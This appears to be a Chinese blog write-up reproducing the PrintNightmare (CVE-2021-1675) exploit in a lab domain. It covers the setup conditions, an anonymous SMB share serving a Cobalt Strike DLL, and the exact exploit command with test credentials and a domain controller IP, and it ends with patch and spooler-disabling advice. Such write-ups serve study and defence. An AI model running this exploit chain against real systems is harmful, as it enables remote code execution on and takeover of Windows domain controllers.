> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/V0acZgnqXS4NYAVdO2m3Cg)

复现漏洞利用的 Windows 版本是 Windows Server 2019 Version 1809，使用了 https://github.com/cube0x0/CVE-2021-1675 项目的 python 版本 exp。

测试流程
----

经过反复测试后，发现远程命令执行需要满足一些条件：

1.  创建的 smb 服务允许匿名访问。
    
2.  验证使用普通域用户的用户名和密码。
    
3.  需要在域环境内。
    

首先在域控上添加一个普通域用户，设置用户名和密码

![](https://mmbiz.qpic.cn/mmbiz_png/cOCqjucntdFv903Lm9Cj8RdLHpia5l7Vib1vMJWbIdGE2PP1FvBwfhvhFrX6vfHspePNFwX8icGMcDBRePe7RZJKw/640?wx_fmt=png)

  

因为 spoolsv.exe 是 x64 的，所以我们这里 Cobalt Strike 也生成 x64 的 dll

![](https://mmbiz.qpic.cn/mmbiz_png/cOCqjucntdFv903Lm9Cj8RdLHpia5l7VibWtWm7dKLsVubMibQIORuIYMbNkSFpKwicBKT6A8bckdt8IHVygofUwmg/640?wx_fmt=png)

  

按照 https://github.com/cube0x0/CVE-2021-1675 的 smb 设置方法，在域内一台主机上提供匿名访问权限的共享文件

![](https://mmbiz.qpic.cn/mmbiz_png/cOCqjucntdFv903Lm9Cj8RdLHpia5l7VibCetPrTEF4J4ZVqP3Rm0dTVJzzzFiaxzBo0jMdL6JianYLpr6uGxhqmNw/640?wx_fmt=png)

  

在域内的其他主机上放置好生成的 artifact.dll，设置分享目录并允许匿名访问，在域控上必须能直接获取到文件

![](https://mmbiz.qpic.cn/mmbiz_png/cOCqjucntdFv903Lm9Cj8RdLHpia5l7Vibg6ka7IVf1FmprPyLf86rCcmQ0C0icaUeSmTS93ficj3SgS8BNPmcfNHQ/640?wx_fmt=png)

  

使用 exp，参数分别是刚才创建的新域用户的用户名和密码，还有 DC 的 ip，最后是 smb 共享文件的路径

```
python CVE-2021-1675.py testUser:123qweASD@192.168.92.150 \\192.168.92.130\share\artifact.dll
```

这里会遇到一些坑，如果报错 **Error: code: 0x5 - rpc_s_access_denied** 说明 smb 还不能匿名访问，如果连续执行成功，但是只复制了 dll 并未执行，可能是验证用户不是普通域用户账号。

使用 Procmon 发现测试用的 artifact.dll 已经被 spoolsv.exe 加载：

![](https://mmbiz.qpic.cn/mmbiz_png/cOCqjucntdFv903Lm9Cj8RdLHpia5l7VibMFiaSC9r76hAMvnr5YBt7bPQQTNgGGC3Jv7ANicK1YG1tEbzN6IOOzEQ/640?wx_fmt=png)

  

上线成功

![](https://mmbiz.qpic.cn/mmbiz_png/cOCqjucntdFv903Lm9Cj8RdLHpia5l7VibDVrhVUpAS4vJudWUNce2PFoORxSicjXrqfTZTYQSicqjkTQn9ZSrUiayw/640?wx_fmt=png)

  

防御方法
----

安装微软 **CVE-2021-1675** 漏洞补丁

https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675

关闭打印机服务

```
Stop-Service SpoolerREG ADD  "HKLM\SYSTEM\CurrentControlSet\Services\Spooler"  /v "Start " /t REG_DWORD /d "4" /f
```

参考文章和项目
-------

*   https://github.com/cube0x0/CVE-2021-1675
    
*   https://github.com/afwu/PrintNightmare
    
*   https://blog.csdn.net/ShelleyLiu0415/article/details/47836855
    
*   http://noahblog.360.cn/cve-2021-1675/
    
*   https://github.com/cube0x0/CVE-2021-1675/issues/19